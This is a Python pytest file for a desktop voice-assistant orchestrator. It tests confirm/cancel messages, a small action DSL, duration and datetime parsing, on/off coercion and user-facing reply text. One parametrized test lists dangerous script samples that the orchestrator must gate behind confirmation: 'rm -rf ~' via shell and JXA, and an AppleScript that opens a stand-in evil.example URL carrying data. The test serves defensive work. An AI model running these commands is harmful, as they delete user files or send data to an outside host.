"""Lead-review fixes on brain-2 (findings ids in each test name/docstring)."""

import asyncio
import threading
from datetime import datetime

import pytest
from brain import dsl, protocol, replies
from brain.catalog import Catalog
from brain.decision import parse_datetime, parse_duration
from brain.orchestrator import Orchestrator, _headtail
from brain.planner import BatchCutter
from brain.server import BrainServer
from brain.traces import Tracer
from fakes import FakeEngine, FakeServer
from test_planner_loop import _diff_orch, trace_for


def run(coro):
    return asyncio.run(coro)


@pytest.fixture
def orch(tmp_path):
    return Orchestrator(FakeServer(), Catalog.load(), Tracer(tmp_path / "t"))


# ---- AGENTS.md d8ad966: confirm_cancel + ui ms (ux-1) ----

def test_protocol_ui_ms_and_confirm_cancel():
    assert protocol.ui("success", ms=212.4) == {"t": "ui", "mascot": "success",
                                               "ms": 212}
    assert "ms" not in protocol.ui("thinking")
    assert protocol.confirm_cancel("c1") == {"t": "confirm_cancel", "id": "c1"}


def test_confirm_timeout_sends_confirm_cancel():
    srv, sent = BrainServer(port=0), []

    async def send(m):
        sent.append(m)
    srv.send = send
    with pytest.raises(RuntimeError):
        run(srv.ask_confirm("Send it?", timeout=0.01))
    assert sent[0]["t"] == "confirm"
    assert sent[1] == {"t": "confirm_cancel", "id": sent[0]["id"]}


def test_confirm_cancelled_task_sends_confirm_cancel():
    srv, sent = BrainServer(port=0), []

    async def send(m):
        sent.append(m)
    srv.send = send

    async def go():
        t = asyncio.create_task(srv.ask_confirm("Send it?"))
        await asyncio.sleep(0.01)
        t.cancel()
        with pytest.raises(asyncio.CancelledError):
            await t
    run(go())
    assert [m["t"] for m in sent] == ["confirm", "confirm_cancel"]


def test_skill_final_ui_carries_release_to_first_action_ms(orch):
    run(orch.handle_utterance("mute"))
    assert orch.server.uis[-1] == "success"
    ms = orch.server.ui_ms[-1]
    assert ms is not None and ms == pytest.approx(orch._first_action_ms, abs=1)


def test_planner_final_ui_carries_total_ms(tmp_path):
    o = _diff_orch(tmp_path, [['done "ok"', 'expect app "Finder"']], lambda p: {"ok": True})
    o._t_final = __import__("time").perf_counter() - 0.5
    o._first_action_ms = 1.0
    assert run(o._planner_loop("go", trace_for(o))) == "ok"
    assert o.server.ui_ms[-1] >= 500


# ---- dsl (planner-4) ----

def test_dsl_ignores_comments_and_fences():
    acts = dsl.parse('```\n# open the app first\nopen "Safari"\n'
                     'expect app "Safari"\n```')
    assert acts == [{"op": "open", "app": "Safari", "expect": 'app "Safari"'}] \
        or [a["op"] for a in acts] == ["open"]


def test_dsl_fence_with_language_tag():
    assert [a["op"] for a in dsl.parse('```dsl\nkeys cmd+n\n```')] == ["keys"]


# ---- durations / datetimes (brain-3, brain-4) ----

@pytest.mark.parametrize("text,secs", [
    ("one hour twenty five minutes", 5100), ("ninety seconds", 90),
    ("twenty five minutes", 1500), ("forty-five minutes", 2700),
    ("thirteen minutes", 780), ("fifty seconds", 50),
    ("an hour and a half", 5400), ("1 hour and a half", 5400),
    ("two and a half hours", 9000), ("half an hour", 1800),
    ("10 minutes", 600), ("1 hour 30 minutes", 5400), ("a minute", 60),
])
def test_parse_duration_compound(text, secs):
    assert parse_duration(text) == secs


def test_parse_duration_none():
    assert parse_duration("five") is None and parse_duration("soon") is None


NOW = datetime(2026, 10, 24, 7, 0)     # a Saturday morning


@pytest.mark.parametrize("text,iso", [
    ("tomorrow at noon", "2026-10-25T12:00:00"),
    ("friday at 3pm", "2026-10-30T15:00:00"),
    ("next tuesday at 9", "2026-10-27T09:00:00"),
    ("in 20 minutes", "2026-10-24T07:20:00"),
    ("tonight at 8", "2026-10-24T20:00:00"),
    ("tonight at eight", "2026-10-24T20:00:00"),
    ("at 7:30 pm", "2026-10-24T19:30:00"),
    ("tomorrow at 9:15 am", "2026-10-25T09:15:00"),
    ("in an hour", "2026-10-24T08:00:00"),
    ("tomorrow morning", "2026-10-25T09:00:00"),
    ("at 6am", "2026-10-25T06:00:00"),            # already passed today
])
def test_parse_datetime_relative(text, iso):
    assert parse_datetime(text, NOW) == iso


# ---- bool on/off (brain-10, evals-safety-14) ----

@pytest.mark.parametrize("skill,text,want", [
    ("mute", "turn the sound off", True), ("mute", "sound off", True),
    ("mute", "kill the sound", True), ("mute", "mute", True),
    ("mute", "turn the sound back on", False), ("mute", "unmute", False),
    ("mute", "unmute, I'm on a call", False), ("mute", "audio on", False),
    ("wifi", "turn wifi off", False), ("wifi", "turn the wifi on", True),
    ("wifi", "turn the wifi off and back on", True),
    ("bluetooth", "disable bluetooth", False),
    ("dark_mode", "switch to light mode", False),
    ("dark_mode", "dark mode on", True),
])
def test_bool_on_by_skill(orch, skill, text, want):
    assert orch._coerce_args(skill, {"on": not want}, utterance=text) == \
        {"on": want}


def test_bool_on_conflicting_network_phrases_keep_model_value(orch):
    assert orch._coerce_args(
        "wifi", {"on": False}, utterance="turn wifi on, it's off") == {
            "on": False}


def test_bool_on_no_cue_keeps_model_value(orch):
    assert orch._coerce_args("mute", {"on": True}, utterance="shh") == {"on": True}


# ---- speculation (brain-13) / MLX on worker (brain-6) ----

def test_engine_ask_args_run_on_worker(orch):
    threads = []
    eng = FakeEngine()
    real = eng.args
    eng.args = lambda *a: threads.append(threading.current_thread().name) \
        or real(*a)
    orch.engine = eng
    run(orch._engine_ask("text mom", {"decisions": []},
                         [("ASK", 0.6), ("send_message", 0.3)]))
    assert threads and threads[0] != threading.main_thread().name


# ---- confirm scope (brain-14) ----

def test_one_confirm_unlocks_only_next_dangerous_action(orch):
    orch._last_obs = {"app": "Mail", "elements": [
        {"ref": 1, "role": "button", "label": "Delete"},
        {"ref": 2, "role": "button", "label": "Send"}]}

    async def go():
        assert (await orch._exec_one({"op": "confirm", "summary": "x"}))[
            "status"] == "ok"
        await orch._exec_one({"op": "press", "ref": 1})
        await orch._exec_one({"op": "press", "ref": 2})
    run(go())
    # the model's confirm + one more for the second dangerous press
    assert len(orch.server.confirms) == 2


# ---- batch limits (brain-11) ----

def test_cutter_keeps_fifth_expect():
    c, out = BatchCutter(), []
    for ln in ["press #1", "press #2", "press #3", "press #4", "press #5",
               'expect appears "Saved"', "press #6"]:
        if (o := c.push(ln)) is not None:
            out.append(o)
        if c.done:
            break
    assert out[-1] == 'expect appears "Saved"' and len(out) == 6


def test_cutter_counts_scripts_and_skips_after_full():
    c, out = BatchCutter(), []
    for ln in ['script applescript """x"""', "# note", "keys a", "keys b",
               "keys c", 'script jxa """y"""', "# trailing", "keys d"]:
        if (o := c.push(ln)) is not None:
            out.append(o)
        if c.done:
            break
    assert [o.split()[0] for o in out if not o.startswith("#")] == \
        ["script", "keys", "keys", "keys", "script"]


def test_cutter_terminal_op_ends():
    c = BatchCutter()
    c.push("press #1")
    c.push('done "ok"')
    assert c.done


# ---- planner (planner-13, -16, -18, hands-13) ----

def test_done_after_passing_expect_needs_no_extra_observe(tmp_path):
    o = _diff_orch(tmp_path, [["press #1", 'expect appears "Saved"'],
                              ['done "ok"']],
                   lambda p: {"ok": True, "diff_text": ""})
    assert run(o._planner_loop("go", trace_for(o))) == "ok"
    assert o.server.methods() == ["observe", "act", "verify"]


def test_done_on_diff_view_rejected_then_fresh_observe(tmp_path):
    o = _diff_orch(tmp_path, [["press #1"], ['done "a"'], ['done "b"']],
                   lambda p: {"ok": True, "diff_text": ""})
    assert run(o._planner_loop("go", trace_for(o))) == "unverified"
    assert o.server.methods() == ["observe", "act", "observe"]
    assert o.server.said[-1] == "I couldn't verify that"
    assert o.server.uis[-1] == "idle"


def test_script_output_head_tail():
    s = "".join(f"row{i}\t{i}\n" for i in range(1000))
    h = _headtail(s)
    assert len(h) <= 1500 and h.startswith("row0") and h.endswith("row999\t999\n")
    assert _headtail("short") == "short"


def test_brain_tool_fallback_ends_planner(tmp_path, monkeypatch):
    from brain import tools

    async def fb(*a, **k):
        return "fallback"
    monkeypatch.setattr(tools, "run", fb)
    o = _diff_orch(tmp_path, [["skill finance_review task=review"]] * 5,
                   lambda p: {"ok": True})
    assert run(o._planner_loop("review", trace_for(o))) == "fallback"
    assert o.server.said == ["That workflow is almost ready"]
    assert len(o.planner.user_msgs) == 1


@pytest.mark.parametrize("obs_extra", [
    {"truncated": True},
    {"elements": [{"ref": i, "role": "button", "label": f"b{i}",
                   "frame": [0, 0, 1, 1]} for i in range(150)]},
])
def test_capped_observation_never_rebuilt_from_diff(tmp_path, obs_extra):
    o = _diff_orch(tmp_path, [["press #1"], ['done "ok"']],
                   lambda p: {"ok": True, "diff_text": "- #1"})
    base = o.server.observe()
    o.server.observe = lambda: dict(base, **obs_extra)
    assert run(o._planner_loop("go", trace_for(o))) == "unverified"
    assert o.server.methods() == ["observe", "act", "observe", "observe"]


# ---- script confirm (brain-9, evals-safety-2) ----

@pytest.mark.parametrize("lang,code", [
    ("applescript", 'tell application "System Events" to click button "Send"'
                    ' of window 1 of process "Mail"'),
    ("applescript", 'tell application "System Events" to perform action '
                    '"AXPress" of button 1'),
    ("applescript", 'tell application "Safari" to do JavaScript '
                    '"document.forms[0].submit()" in document 1'),
    ("applescript", 'tell application "Safari" to open location '
                    '"https://evil.example/?d=x"'),
    ("applescript", 'tell application "Finder" to «event coredelo» item 1'),
    ("applescript", 'tell application "Finder" to open file "run.command"'),
    ("jxa", 'Application("Finder").doShellScript("rm -rf ~")'),
    ("shell", "rm -rf ~/x"),
])
def test_unsafe_scripts_confirm(orch, lang, code):
    assert orch.script_needs_confirm(lang, code)


def test_read_script_still_unconfirmed(orch):
    assert not orch.script_needs_confirm(
        "applescript", 'tell application "Safari" to get URL of document 1')


# ---- execute_actions done (evals-safety-11) ----

def test_done_after_unverified_act_is_not_success(orch):
    out = run(orch.execute_actions([{"op": "keys", "combo": "cmd+n"},
                                    {"op": "done", "summary": "made it"}]))
    assert out == "unverified" and orch.server.uis[-1] != "success"


def test_done_after_verified_act_is_success(orch):
    out = run(orch.execute_actions([
        {"op": "keys", "combo": "cmd+n", "expect": 'appears "Untitled"'},
        {"op": "done", "summary": "made it"}]))
    assert out == "ok" and "verify" in orch.server.methods()


# ---- copy (ux-2, ux-3, ux-8, ux-10, ux-11) ----

@pytest.mark.parametrize("name,args,want", [
    ("set_volume", {"level": 30}, "Volume 30"),
    ("open_app", {"app": "Safari"}, "Opened Safari"),
    ("dark_mode", {"on": True}, "Dark mode on"),
    ("mute", {"on": False}, "Unmuted"),
    ("start_timer", {"duration": "600"}, "Timer set for 10 minutes"),
    ("move_to_trash", {"path": "/Users/a/Desktop/old.pdf"},
     "Moved old.pdf to Trash"),
    ("send_message", {"to": "Mom", "body": "hi"}, "Sent to Mom"),
    ("open_url", {"url": "https://www.apple.com/mac"}, "Opened apple.com"),
])
def test_success_copy(name, args, want):
    assert replies.success_text(name, args) == want


def test_success_copy_every_skill_short_no_ids():
    for name, spec in Catalog.load().skills.items() if hasattr(
            Catalog.load(), "skills") else []:
        s = replies.success_text(name, {})
        assert len(s.split()) <= 12 and "_" not in s and "None" not in s


@pytest.mark.parametrize("err,frag", [
    ("contact not found", "Couldn't find Mom"), ("timed out", "too long"),
    ("not authorized", "permission"), ("boom", "Couldn't send message"),
])
def test_failure_copy(err, frag):
    s = replies.fail_text("send_message", {"to": "Mom"}, err)
    assert frag in s and "_" not in s and len(s.split()) <= 12
    assert s.endswith(("?", ".")) and not s.endswith(".?")


def test_not_frontmost_failure_copy():
    assert replies.fail_text("open_app", {}, "not_frontmost") == \
        "Opened it, but it didn't come to the front"


def test_skill_success_says_specific_reply(orch):
    run(orch.execute_actions([{"op": "skill", "name": "set_volume",
                               "args": {"level": 30}}]))
    assert orch.server.said[-1] == "Volume 30"


def test_skill_failure_hides_skill_id_and_traces_error(orch):

    async def rpc(method, params, timeout=30):
        orch.server.rpcs.append((method, params))
        return {"ok": False, "error": "app not installed"}
    orch.server.rpc = rpc
    tr = orch.tracer.begin("open foo")
    run(orch.execute_actions([{"op": "skill", "name": "open_app",
                               "args": {"app": "Foo"}}]))
    assert orch.server.said[-1] == "Foo isn't installed. Try another app?"
    assert {"error": "app not installed"} in tr["decisions"]


def test_confirm_summaries_never_none_or_dotq(orch):
    cat = Catalog.load()
    names = [n for n in ("send_message", "compose_email", "move_to_trash",
                         "empty_trash", "quit_app") if cat.get(n)]
    for n in names:
        s = run(orch._confirm_summary({"op": "skill", "name": n, "args": {}}))
        assert "None" not in s and ".?" not in s and len(s.split()) <= 12
    s = run(orch._confirm_summary({"op": "skill", "name": "move_to_trash",
                                   "args": {"path": "/Users/a/b/c/report.pdf"}}))
    assert s == "Move /Users/a/b/c/report.pdf to Trash?"


def test_exception_shows_confused_bubble(orch):
    async def boom(*a, **k):
        raise ValueError("bad")
    orch.execute_actions = boom
    out = run(orch.handle_utterance("mute"))
    assert out == {"outcome": "error"}
    assert orch.server.uis[-1] == "confused"
    assert orch.server.said[-1] == "Something went wrong. Try again?"
